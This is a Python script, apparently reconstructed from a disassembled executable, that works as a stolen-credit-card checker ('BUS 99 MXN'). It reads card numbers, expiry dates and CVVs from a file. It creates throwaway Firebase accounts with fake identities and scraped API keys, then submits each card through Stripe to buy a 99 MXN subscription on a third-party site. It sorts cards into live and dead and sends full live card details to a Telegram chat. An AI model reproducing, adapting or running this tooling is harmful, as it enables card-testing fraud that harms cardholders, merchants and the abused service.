# ============================================================
# Script: leviatan_bus99.py (RECONSTRUIDO del .exe)
# Basado en: disassembly + strings extraídos
# ATENCIÓN: Reconstrucción aproximada, no el código original
# ============================================================

import os, sys, time, requests, hashlib, platform, subprocess, uuid, re
import random, string, json, logging, threading
from datetime import datetime
from urllib.parse import urlencode
from faker import Faker
import cloudscraper as reqs
from flask import Blueprint, request, jsonify
from requests.adapters import HTTPAdapter

# ─────────────────────────────────────────────
# CONFIGURACIÓN
# ─────────────────────────────────────────────
_STRIPE_DIRECT = False
_BUZ_ORIGIN = "https://rutadirecta.com"
_BUZ_FIREBASE_KEY_FALLBACK = "AIzaSyAlxVoA-kJ7w5F4S24tYxdBYaMGZttvjE0"
_BUZ_AUTH_KEY_MARK = "GZttvjE0"
_BUZ_KEY_TTL_SEC = 3600

TELEGRAM_BOT_TOKEN = None          # ← Configurar aquí
TELEGRAM_CHAT_ID = None            # ← Configurar aquí

_buz_key_cache = None
_buz_key_lock = threading.Lock()

logging.getLogger().setLevel(logging.WARNING)

# ─────────────────────────────────────────────
# PROXY
# ─────────────────────────────────────────────
proxysoax = None  # {"http": "...", "https": "..."}

# =============================================================
#  FUNCIONES STRIPE
# =============================================================

_SOFT_DECLINE_KEYWORDS = [
    "insufficient_funds", "insufficient funds",
    "incorrect_cvc", "invalid_cvc",
    "security code is invalid", "incorrect cvc",
]

def _stripe_soft_live(*parts):
    """Verifica si el mensaje Stripe indica un soft decline (Live)"""
    blob = " ".join(p for p in parts if p).lower()
    return any(kw in blob for kw in _SOFT_DECLINE_KEYWORDS)


def _stripe_card_result(ccs, message="", *blob_parts):
    """
    Determina si la tarjeta es Live o Dead según la respuesta Stripe.
    Retorna dict: {"cc": ccs, "status": "✅ Live"|"❌ Dead", "message": msg}
    """
    msg = (message or "").strip() or "Declined"
    
    # Si es soft decline → la tarjeta es válida (Live)
    if _stripe_soft_live(msg, *blob_parts):
        return {"cc": ccs, "status": "✅ Live", "message": msg}
    
    return {"cc": ccs, "status": "❌ Dead", "message": msg}


# =============================================================
#  FIREBASE AUTH (para obtener idToken)
# =============================================================

def _firebase_auth_headers(base_headers):
    """Headers completos para Firebase Auth (con Referer/Origin)"""
    return {
        "User-Agent": base_headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36"),
        "Content-Type": "application/json",
        "X-Client-Version": base_headers.get("X-Client-Version", "Chrome/JsCore/8.2.9/FirebaseCore-web"),
        "Referer": "https://rutadirecta.com/",
        "Origin": "https://rutadirecta.com",
    }


def _firebase_auth_headers_minimal(base_headers):
    """Headers mínimos para Firebase Auth (sin Referer/Origin)"""
    return {
        "User-Agent": base_headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36"),
        "Content-Type": "application/json",
        "X-Client-Version": base_headers.get("X-Client-Version", "Chrome/JsCore/8.2.9/FirebaseCore-web"),
    }


def _extract_firebase_api_keys(text):
    """Extrae apiKeys de Firebase desde HTML/JS"""
    if not text:
        return []
    
    # Limpiar URLs de Google Maps
    cleaned = re.sub(r'https?://maps\.googleapis\.com[^\s"\'<>]*', ' ', text, flags=re.I)
    
    found = []
    patterns = [
        r'apiKey["\']?\s*[:=]\s*["\'](AIzaSy[A-Za-z0-9_-]+)',
        r'["\']apiKey["\']\s*:\s*["\'](AIzaSy[A-Za-z0-9_-]+)',
        r'firebaseConfig[\s\S]{0,400}?apiKey\s*:\s*[\'\"](AIzaSy[A-Za-z0-9_-]+)',
    ]
    for pat in patterns:
        found.extend(re.findall(pat, cleaned, re.I))
    
    low = cleaned.lower()
    if "firebase" in low or "identitytoolkit" in low or "firebaseapp" in low:
        found.extend(re.findall(r'AIzaSy[A-Za-z0-9_-]{33}', cleaned))
    
    # Filtrar keys no autorizadas
    _NON_AUTH_KEY_SUFFIXES = ("BoXoWRnQ", "F2_rvQAg")
    seen = set()
    out = []
    for k in found:
        if k.startswith("AIzaSy") and k not in seen:
            if not any(k.endswith(s) for s in _NON_AUTH_KEY_SUFFIXES):
                seen.add(k)
                out.append(k)
    return out


def invalidate_buz_firebase_key_cache():
    """Invalida el caché de apiKeys Firebase"""
    with _buz_key_lock:
        _buz_key_cache = None


def fetch_buz_firebase_api_keys(session, force_refresh=False):
    """Obtiene apiKeys de Firebase desde rutadirecta.com (cache 1h)"""
    global _buz_key_cache
    with _buz_key_lock:
        if not force_refresh and _buz_key_cache:
            if time.time() - _buz_key_cache[1] < _BUZ_KEY_TTL_SEC:
                return list(_buz_key_cache[0]), "cache"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "es-419,es;q=0.9",
    }
    
    try:
        blobs = []
        r = session.get(_BUZ_ORIGIN, headers=headers, timeout=30)
        blobs.append(r.text or "")
        
        # Buscar scripts adicionales
        for src in re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', blobs[0], re.I)[:30]:
            if src.startswith("//"):
                url = "https:" + src
            elif src.startswith("/"):
                url = _BUZ_ORIGIN.rstrip("/") + src
            elif src.startswith("http"):
                url = src
            else:
                continue
            try:
                r2 = session.get(url, headers=headers, timeout=25)
                blobs.append(r2.text or "")
            except Exception:
                pass
        
        # Extraer keys
        keys = []
        for blob in blobs:
            for k in _extract_firebase_api_keys(blob):
                if k not in keys:
                    keys.append(k)
        
        note = "fallback" if not keys else "scrape"
        if not keys:
            keys = [_BUZ_FIREBASE_KEY_FALLBACK]
        else:
            # Buscar key que termine con el auth mark
            auth_key = _BUZ_FIREBASE_KEY_FALLBACK
            for k in keys:
                if k.endswith(_BUZ_AUTH_KEY_MARK):
                    auth_key = k
                    break
            keys = [auth_key]
        
        # Actualizar cache
        with _buz_key_lock:
            _buz_key_cache = (keys, time.time())
        return keys, note
    
    except Exception as exc:
        logging.warning("rutadirecta fetch: %s", exc)
        return [_BUZ_FIREBASE_KEY_FALLBACK], f"fetch error: {exc}"


def fetch_buz_firebase_api_key(session, force_refresh=False):
    keys, note = fetch_buz_firebase_api_keys(session, force_refresh=force_refresh)
    return keys[0], note


def _firebase_error_text(payload, fallback=""):
    """Extrae texto de error de respuesta Firebase"""
    err = payload.get("error")
    if isinstance(err, dict):
        msg = err.get("message") or err.get("status")
        if msg:
            return str(msg)
    if fallback:
        return str(payload)[:200]
    return fallback


def _firebase_signup_with_key(session, email, password, headers, api_key):
    """Registra usuario en Firebase con una apiKey"""
    params = {"key": api_key}
    body = {"email": email, "password": password, "returnSecureToken": True}
    url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/signupNewUser"
    
    header_modes = (_firebase_auth_headers(headers), _firebase_auth_headers_minimal(headers))
    last_err = ""
    
    for fb_headers in header_modes:
        try:
            r = session.post(url, params=params, headers=fb_headers, json=body, timeout=30)
            j = r.json() if r.content else {}
            tok = j.get("idToken")
            if tok:
                return str(tok), ""
            
            last_err = _firebase_error_text(j, f"HTTP {r.status_code}" if hasattr(r, 'status_code') else r.text[:200])
            # Si el error no es de referer, intentar con el otro header mode
            if "referer" not in (last_err or "").lower():
                continue
        except Exception:
            try:
                last_err = _firebase_error_text(r.json() if r else {}, 
                                                f"HTTP {r.status_code}" if r and hasattr(r, 'status_code') else "?")
            except Exception:
                last_err = r.text[:200] if r and hasattr(r, 'text') else "Error de conexión"
    
    return None, last_err or "Firebase sin idToken"


def buz_firebase_signup_id_token(session, email, password, headers):
    """Obtiene idToken de Firebase para buz.yt"""
    last_err = ""
    
    for round_i in range(2):
        force = round_i > 0
        api_key, key_src = fetch_buz_firebase_api_key(session, force_refresh=force)
        
        tok, err = _firebase_signup_with_key(session, email, password, headers, api_key)
        
        if tok:
            logging.info("Firebase signup OK (%s)", key_src)
            return tok
        
        last_err = err or "Error desconocido"
        logging.warning("Firebase signup fail (%s): %s", key_src, last_err)
        
        # Si el error contiene ciertas palabras, invalidar cache y reintentar
        err_up = (last_err or "").upper()
        if any(x in err_up for x in ["KEY", "API", "QUOTA", "DENIED", "NOT_FOUND"]):
            invalidate_buz_firebase_key_cache()
    
    return None


# =============================================================
#  FUNCIÓN PRINCIPAL - BUS CHECK CARD
# =============================================================

def bus_check_card(session, card_normalizada, monto="99"):
    """
    Flujo completo: Firebase Auth → Stripe Source → Attach → Subscription
    card_normalizada: dict con number, month, year, cvc
    """
    fake = Faker()
    profile = fake.profile()
    email = f"{profile['name'].split()[0].lower()}{random.randint(1,999)}@gmail.com"
    password = "Temp1234!"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36"}
    
    # 1. Obtener idToken de Firebase
    id_token = buz_firebase_signup_id_token(session, email, password, headers)
    if not id_token:
        return {"cc": card_normalizada.get("number", ""), "status": "⚠️ Error", "message": "No se pudo obtener idToken Firebase"}
    
    # 2. Login en api.buz.yt
    login_url = "https://api.buz.yt/login"
    login_headers = {
        "Authorization": f"Bearer {id_token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
    }
    
    r_login = session.post(login_url, headers=login_headers, 
                           json={"email": email, "password": password}, timeout=30)
    
    if r_login.status_code != 200:
        return {"cc": card_normalizada.get("number", ""), "status": "⚠️ Error", "message": f"Login fallido: HTTP {r_login.status_code}"}
    
    login_data = r_login.json()
    customer_id = login_data.get("customerId")
    if not customer_id:
        return {"cc": card_normalizada.get("number", ""), "status": "⚠️ Error", "message": "No customerId returned"}
    
    # 3. Crear Source en Stripe
    stripe_key = "pk_live_QirjIkB3l57NlpgoirN99DIh0039EmCVjd"
    stripe_params = {
        "type": "card",
        "card[number]": card_normalizada["number"],
        "card[exp_month]": card_normalizada["month"],
        "card[exp_year]": card_normalizada["year"],
        "card[cvc]": card_normalizada["cvc"],
        "key": stripe_key,
    }
    stripe_headers = {
        "Referer": "https://rutadirecta.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    r_source = session.post("https://api.stripe.com/v1/sources", 
                            data=stripe_params, headers=stripe_headers, timeout=30)
    
    source_data = r_source.json()
    source_id = source_data.get("id")
    if not source_id:
        return _stripe_card_result(card_normalizada.get("number", ""), 
                                   source_data.get("error", {}).get("message", "No sourceId returned"))
    
    # 4. Attach source to customer
    attach_url = f"https://api.buz.yt/stripe/attachSourceToCustomer?customerId={customer_id}"
    r_attach = session.post(attach_url, headers=login_headers, 
                           json={"sourceId": source_id}, timeout=30)
    
    attach_data = r_attach.json()
    if attach_data.get("error"):
        return _stripe_card_result(card_normalizada.get("number", ""), 
                                   str(attach_data.get("error", "")), attach_data.get("message", ""))
    
    # 5. Crear suscripción ($99 MXN)
    sub_url = "https://api.buz.yt/stripe/create-subscription"
    r_sub = session.post(sub_url, headers=login_headers,
                        json={"priceId": "price_99_mxn", "customerId": customer_id}, timeout=30)
    
    sub_data = r_sub.json()
    
    # Verificar resultado
    if sub_data.get("status") == "active" or sub_data.get("subscription", {}).get("status") == "active":
        return {"cc": card_normalizada.get("number", ""), "status": "✅ Live", "message": "Recarga exitosa 99 MXN"}
    
    # StripeCardError o decline
    error_msg = sub_data.get("error", {}).get("message", "") or sub_data.get("message", "")
    return _stripe_card_result(card_normalizada.get("number", ""), error_msg, str(sub_data))


# =============================================================
#  FUNCIONES AUXILIARES
# =============================================================

def procesar_y_validar(card_str):
    """Valida formato de tarjeta"""
    if not card_str or not isinstance(card_str, str):
        return None
    card_str = card_str.strip()
    for ch in "/#%&()=?¿!¡*[]{}-_.:,;|@+":
        card_str = card_str.replace(ch, "|")
    card_str = card_str.replace(" ", "|")
    parts = [v for v in card_str.split("|") if v]
    if len(parts) < 4:
        return None
    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3][:4]
    ano = ano[-2:] if len(ano) > 2 else ano
    mes = str(int(mes)).zfill(2)
    # Validar fecha
    try:
        if int(mes) < 1 or int(mes) > 12:
            return None
    except ValueError:
        return None
    return {"number": cc, "month": mes, "year": ano, "cvc": cvv}


def _parse_bus_result(cc, status, msg):
    """Convierte resultado a texto"""
    if status == "✅ Live":
        return f"✅ {cc[:6]}******{cc[-4:]} | LIVE | {msg[:100]}"
    return f"❌ {cc[:6]}******{cc[-4:]} | DEAD | {msg[:100]}"


def enviar_live_telegram(texto):
    """Envía Live a Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": texto, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception:
        pass


# =============================================================
#  MENÚ PRINCIPAL
# =============================================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def show_dragon():
    print(r"""
        ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗ █████╗ ███╗   ██╗
        ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██╔══██╗████╗  ██║
        ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║██╔██╗ ██║
        ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██║╚██╗██║
        ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║ ╚████║
        ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
                       BUS 99 MXN — @scanor24
    """)


def show_menu():
    print("=" * 50)
    print("                    EMPEZAR CHECK")
    print("=" * 50)
    print("  [1] Empezar Check")
    print("  [q] Salir")
    print()


def empezar_check(session):
    """Ejecuta el checker con tarjetas desde Cards.txt"""
    if not os.path.exists("Cards.txt"):
        print("[!] El archivo Cards.txt no existe.")
        print("[+] Creando archivo Cards.txt...")
        with open("Cards.txt", "w") as f:
            f.write("# Formato: CC|MM|AA|CVV\n")
        print("[+] Archivo creado. Agregue las tarjetas en formato: CC|MM|AA|CVV")
        input("Presione Enter para continuar...")
        return
    
    with open("Cards.txt", "r") as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    
    if not lines:
        print("[!] Cards.txt está vacío")
        return
    
    print(f"\n[+] Procesando {len(lines)} tarjetas...\n")
    
    for card_str in lines:
        card_data = procesar_y_validar(card_str)
        if not card_data:
            print(f"❌ Formato inválido: {card_str}")
            continue
        
        print(f"▶️ Probando: {card_data['number'][:6]}******{card_data['number'][-4:]}")
        
        resultado = bus_check_card(session, card_data)
        print(f"   → {resultado.get('status')} | {resultado.get('message', '')[:80]}")
        
        if resultado.get("status") == "✅ Live":
            enviar_live_telegram(
                f"✅ <b>LIVE - BUS 99 MXN</b>\n"
                f"💳 <b>Tarjeta:</b> <code>{card_str}</code>\n"
                f"📝 {resultado.get('message', '')[:200]}"
            )
        
        # Limpiar cards.txt después de cada intento
        with open("Cards.txt", "r") as f:
            restantes = [l for l in f.read().splitlines() if l.strip() and not l.startswith("#") and l.strip() != card_str]
        with open("Cards.txt", "w") as f:
            f.write("\n".join(restantes) + ("\n" if restantes else ""))
    
    print("\n[+] Proceso completado")
    input("Presione Enter para continuar...")


def empezar_check_menu():
    clear_screen()
    show_dragon()
    session = reqs.create_scraper()
    if proxysoax:
        session.proxies = proxysoax
    
    while True:
        show_menu()
        opcion = input("Seleccione una opción: ").strip()
        if opcion == "1":
            empezar_check(session)
        elif opcion.lower() == "q":
            break
        else:
            print("Opción inválida")
            time.sleep(1)


def main():
    empezar_check_menu()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario")
        sys.exit(0)
